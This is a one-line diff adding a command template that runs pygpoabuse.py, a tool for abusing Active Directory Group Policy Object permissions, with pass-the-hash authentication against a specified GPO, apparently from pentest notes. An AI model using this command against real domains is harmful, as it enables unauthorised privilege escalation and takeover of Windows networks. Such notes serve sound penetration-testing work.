@@ -1,0 +1,1 @@
+pygpoabuse.py $DOMAIN/$USER -hashes lm:$NT_HASH -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
